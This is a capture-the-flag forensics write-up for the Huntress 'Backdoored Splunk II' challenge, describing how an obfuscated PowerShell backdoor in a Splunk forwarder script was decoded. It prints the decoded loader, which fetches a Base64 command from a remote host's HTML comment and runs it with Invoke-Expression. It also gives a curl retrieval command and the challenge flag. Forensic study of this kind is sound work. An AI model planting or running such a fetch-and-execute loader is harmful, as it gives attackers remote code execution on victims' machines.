@@ -1,0 +1,57 @@
+# Backdoored Splunk II
+
+You've probably seen Splunk being used for good, but have you seen it used for evil?  
+  
+**NOTE: the focus of this challenge should be on the downloadable file below. It uses the dynamic service that is started, but you must put the puzzle pieces together to be retrieve the flag.**
+
+File: [Splunk_TA_windows.zip]()
+
+-----
+
+**Backdoored Splunk II** was a forensics challenge released on Day #20 of the Huntress Labs Capture the Flag (CTF) competition. We were given a Zip file, `Splunk_TA_windows.zip`, containing a [Windows Splunk Forwarder](https://www.splunk.com/en_us/blog/learn/splunk-universal-forwarder.html) and tasked within identifying a malicious backdoor. This challenge was a sequel to the **Backdoored Splunk** challenge from last year’s CTF.
+
+Upon extracting the file, we found the following directory structure:
+
+![](https://cdn-images-1.medium.com/max/800/1*J5CBOcEubl_kEq8exvf0tQ.png)
+
+Inside the `bin\` directory, we discoverd several Batch and PowerShell scripts responsible for the core functionality of the forwarder.
+
+![](https://cdn-images-1.medium.com/max/800/1*xWWR61Aa0bwDifRBOrOyfw.png)
+
+While reviewing the files, we identified a sucpisious line within `dns-health.ps1` that converts a list of numeric values, concatenates them with `[STRinG]::JoIN` and executes through `Invoke-Expression` .
+
+![](https://cdn-images-1.medium.com/max/800/1*nYRPiX45LafQ8hGGum7-8g.png)
+
+We extracted the numbers inside the brackets and used [CyberChef](https://gchq.github.io/CyberChef/#recipe=Remove_whitespace%28true,true,true,true,true,false%29Find_/_Replace%28%7B%27option%27:%27Regex%27,%27string%27:%27,%27%7D,%27%20%27,true,false,true,false%29From_Decimal%28%27Space%27,false%29&input=MzYgLCA3OSAsODMgLCA4NiwgNjkgLDgyICwzMiwgNjEsMzIsMzkgLCAxMDUsIDEwMSwgMTIwICwgMzIgLCA0MCAsOTEgLDgzICwgMTIxICwgMTE1ICwgMTE2LDEwMSAsIDEwOSwgNDYsODQgLDEwMSAsMTIwICwgMTE2ICw0Niw2OSAsMTEwICw5OSwgMTExICwgMTAwLCAxMDUgLDExMCAsMTAzICw5MywgNTggLDU4ICw4NSwgODQsNzAgLCA1Niw0Niw3MSAsMTAxICwxMTYsODMsMTE2LCAxMTQgLCAxMDUgLCAxMTAsIDEwMyAsNDAgLCA5MSAsIDgzICwxMjEgLCAxMTUgLDExNiwgMTAxLCAxMDkgLCA0NiAsNjcgLDExMSwgMTEwLDExOCAsIDEwMSwgMTE0ICwxMTYgLCA5MywgNTggLDU4LCA3MCwxMTQgLDExMSwgMTA5ICw2Niw5NyAsIDExNSwgMTAxLDU0LCA1MiAsIDgzICwgMTE2ICwgMTE0ICwxMDUgLCAxMTAsMTAzLDQwICwzNCw3MywxMjEgLCA2NSAsIDEwNyw4NSwgNjkgLCA1NyAsIDgzLDg2ICw2NyAsNjYgLDEwNSw5MCAsODcsIDEyMCwgMTE4ICwgMTAwLDEyMSwgNjYsMTEyICw5OSwxMjEgLCA2NiAsMTA3ICwxMDEsIDg3ICwgNTMgLCAxMDQsOTggLDg3ICwgMTA4ICwgMTA2LCA3MyAsIDcyICwgODIgLCAxMTggLDczLCA3Miw4MiAsIDExMSwgOTAgLCA4MywgNjYsIDEyMSAsIDEwMCAsIDg3LCA1MyAsIDExNyAsOTcgLCA4NyAsIDUzICwgMTEwLCA3Myw3MiAsNzgsIDEwOCAsOTksIDExMCAsIDkwICwgMTEyLCA4OSw1MCAsODUgLCAxMDMsIDk4ICw1MCAsODksMTAzICwgMTAwLDcxLDEwNCAsMTA4LDczLCA3MSAsNjYgLCA4NCwgMTAwLCA3MSwgNzAgLCAxMjEgLCAxMDAgLDcxICwgNjUsIDEwMywgODksIDExMCw4Niw0OCwgMTAwLDcxICwgNTcsIDExNyAsIDY4LCA4MSwgMTEyLDY1ICw3NSAsIDY3LDgyLDExMSAsMTAwICw3MSAsNDkgLCAxMTUgLDczICwgNjgsNDgsMTAzLCA3NSAsNjksIDEwOCwxMTcsMTAwLCAxMDkgLDU3LDExNCAsIDkwICwgODMgLCA0OSw4OCwgOTAgLDg3LDc0LDgzLDkwLCA4OCwgNzAsIDQ5LCA5MCw4OCwgNzggLDQ4LCA3Myw3MSAsMTA0ICw0OCAsMTAwLDcyICwgNjUgLCA1NCAsNzYsIDEyMSwgNTcsMTA2ICwgOTcsNzEsIDcwLDExNSw5OCAsNzEsIDg2ICwxMTcgLCA5MCwgNTAsODUgLDExNyw4OSAsIDUxICw4MiwxMDksNzYgLDEwOSwgMTAwLCAxMDQsOTggLDg3ICw4NiwgMTIyICw3OSAsIDEwNSwgODIgLDgxICw4NCAsIDQ5LDc0LCA4NSAsIDczLDY3LDQ5ICw3MyAsIDkwICw4NyAsNzAsMTA3ICwgOTAsIDg4ICwgNzQsMTIyICw3Myw2OSwgNjYgLDU1ICw4MSAsODggLCA4NiAsNDggLDk3ICw3MSAsNTcgLCAxMjEgLDk3LDg4LCAxMTIsMTA0LCAxMDAgLDcxICwxMDgsIDExOCw5OCwxMDYgLCA0OCAsMTExLDczICwxMDcsIDc0LCAxMDQsOTksNTAgLDEwOCwxMDYsNzMsNzAsIDEwOCAsIDExNiwgODIsMTA5LDExMiAsMTA0LCA3NyAsMTA4LCA3NCAsNTAgLDg5LDEwNiAsNzggLCA3NCAsNzgsMTA5ICw4MiwgNzIgLCA5Nyw3MiwgNjYsIDEwNiAsNzcgLCA4NCAsMTA4ICwxMTksIDg5ICwgMTIyLDY5LCA1Myw3NyAsIDcxICwgNzAgLCA3MiAsODYsIDEwOSw5MCwgMTA0ICwgODMgLCA3MCw3MywxMTkgLDg5ICwgNDgsIDg5ICwgNTMgLDEwMSAsMTA4LCAxMTIsIDg5ICwgODMgLCAxMDYsNzQgLCA5NywgODcgLDY5LDExMiAsIDEwOSAsODkgLDEyMiwgNzQsODcgLDk3LCAxMDksNzgsIDExNiwgODYsMTA2ICwgNjUsIDEwNSw3NSwgODggLCA0OCwgMTAzICwgNzYsODYgLDg2ICwxMjIsIDkwICwgODUsNzQgLCAxMDQgLDk5LCA1MCwxMDgsIDEwNiAsODUsIDcxLCA3MCAsMTIxLDk5LDUwICwgMTA4ICwgMTE3ICwgOTAsMTIxICwgMTA3ICwxMTcsIDgxLDUwICw1NywxMTcsIDEwMCwgNzEgLCA4NiAsIDExNywgMTAwICwgNjUsIDQ4ICwgNzUsOTcgLCA4Nyw4OSAsMTAzLCA3NSAsNjcsIDgyICwgMTExLDEwMCAsNzEgLCA0OSwgMTE1ICw3MyAsNjcsNDkgLDExNiAsIDg5ICwgODgsIDgyLDEwNiAsOTcgLCA2NyAsIDY1LDExMCwgODAsIDY3ICwgNjkgLCAxMTYgLCA3Niw4MyAsIDEwMywgMTE3ICwgNzUgLDEwNiAsIDU2ICwxMTIgLDc2ICwgODMsNDgsNDMsNzQsMTIxICwgMTA3ICwxMDMgLCAxMDEsMTE5ICw0OCAsNzUsIDczLDY3ICwgNjUgLDEwMyw3MyAsIDY3ICwgODIsIDUwLDg5ICw4NywgMTIwLDQ5ICw5MCAsODMsIDY1ICwgNTcgLCA3MywgNjcsIDgyLCAxMTYgLDg5LCA4OCAsIDgyLDEwNiAsOTcgLDcxLCA4NiwxMjIsIDg3LCAxMjIsNzAsMTAwICwgNjgsIDgxICwxMTEsMTAzICwgNzMgLDY3LDY1ICwgMTAzICwgNzQgLCA3MSwgNzggLDExOCwgOTggLDg3ICw0OSwgMTA0ICw5OCAsMTA5ICw4MSwgMTAzLDgwICwgODMgLCA2NiwgOTggLDg1ICwgNTEgLCAxMDgsIDEyMiAsIDEwMCAsNzEsODYsIDExNiwgNzYsMTA4ICw4MiwgMTA4ICwgMTAxLDcyLDgxLDExNyAsODIsODcgLDUzICwxMDYgLDk4ICwgNTAsIDgyICwgMTEyICw5OCwxMDkgLDEwMCwxMDAgLCA3OSAsIDEwNiAsIDExMiAsODYgLDg2ICwgNjkgLCA4OSw1MiAsNzYsMTA3ICwgMTAwLDEwOCwgMTAwICwgNzAsIDc4LDQ4ICw5OSwxMDkgLCAxMDgsMTE3ICwgOTAgLCAxMjEsIDEwNCAsIDk4ICwgODUsIDUxLCAxMDggLDEyMiwgMTAwLCA3MSwgODYsIDExNiAsIDc2ICwgMTA3LCA3OCAsMTE4ICw5OCwgMTEwLDkwLCAxMDggLCA5OSwgMTEwLDgyLDEwMCwgNzksMTA2LDExMiwgNzEsOTksMTA5LCA1NywgMTE2ICwgODEgLCAxMDkgLCA3MCAsIDEyMiAsIDkwICwgODQsODkgLCA0OCAsIDg1LCA1MSAsIDgyLDEyMSAsIDk3ICw4Nyw1MywgMTEwLDc1LDY3LDgyICw1MCw4OSAsIDg3ICwgMTIwICwgNDkgLDkwICwgODMgLCAxMDcgLDExMiAsNjgsIDgxLDExMSwgMTAzICwgNzMsIDY3LCA2NSAsMTAzICw4MyAsODcsIDUzICw1MCAsIDk4ICwgNTAsIDExNiAsIDEwOCwgNzYsODUsODYgLCA1MiAsOTkgLDcyLCA3NCAsMTA4LCA5OSw1MSAsNzgsIDExMiAsOTgsIDUwICwgNTIgLCAxMDMsIDc0LCA3MSwgNzgsMTE4LCA5OCwgODcgLCA0OSAsMTA0ICw5OCwgMTA5ICw4MSAsIDc4ICw2NyAsMTEwLDQ4ICwgMTEyICwgMzQsNDEsIDQxICwgNDEsMzkK) to decode them, which produced a second PowerShell command which uses `Invoke-Expression` (`iex`) to execute a Base64-encoded string.
+
+```
+$OSVER = 'iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("IyAkUE9SVCBiZWxvdyBpcyBkeW5hbWljIHRvIHRoZSBydW5uaW5nIHNlcnZpY2Ugb2YgdGhlIGBTdGFydGAgYnV0dG9uDQpAKCRodG1sID0gKEludm9rZS1XZWJSZXF1ZXN0IGh0dHA6Ly9jaGFsbGVuZ2UuY3RmLmdhbWVzOiRQT1JUIC1IZWFkZXJzIEB7QXV0aG9yaXphdGlvbj0oIkJhc2ljIFltRmphMlJ2YjNJNmRHaHBjMTlwYzE5MGFHVmZhSFIwY0Y5elpYSjJaWEpmYzJWamNtVjAiKX0gLVVzZUJhc2ljUGFyc2luZykuQ29udGVudA0KaWYgKCRodG1sIC1tYXRjaCAnPCEtLSguKj8pLS0+Jykgew0KICAgICR2YWx1ZSA9ICRtYXRjaGVzWzFdDQogICAgJGNvbW1hbmQgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCR2YWx1ZSkpDQogICAgSW52b2tlLUV4cHJlc3Npb24gJGNvbW1hbmQNCn0p")))'
+```
+
+Decoding this yielded the following:
+
+```
+$PORT below is dynamic to the running service of the Start button  
+@($html = (Invoke-WebRequest http://challenge.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dGhpc19pc190aGVfaHR0cF9zZXJ2ZXJfc2VjcmV0")} -UseBasicParsing).Content  
+if ($html -match '<!--(.*?)-->') {  
+    $value = $matches[1]  
+    $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($value))  
+    Invoke-Expression $command  
+})
+```
+
+The above PowerShell code makes a web request to the given instance with header `Authorization: Basic YmFja2Rvb3I6dGhpc19pc190aGVfaHR0cF9zZXJ2ZXJfc2VjcmV0` and returns a Base64-encoded string within a HTML comment (`<!-- -->`).
+
+To obtain the flag, we replicated the web request via `curl` as follows:
+
+```
+$ curl -s -H "Authorization: Basic YmFja2Rvb3I6dGhpc19pc190aGVfaHR0cF9zZXJ2ZXJfc2VjcmV0" http://challenge.ctf.games:[PORT]
+```
+
+![](https://cdn-images-1.medium.com/max/800/1*bCOGOOtZnrpq2HPBZhsg4A.png)
+
+cURL request to instance to retrieve the flag
+
+```
+flag{e15a6c0168ee4de7381f502439014032}
+```
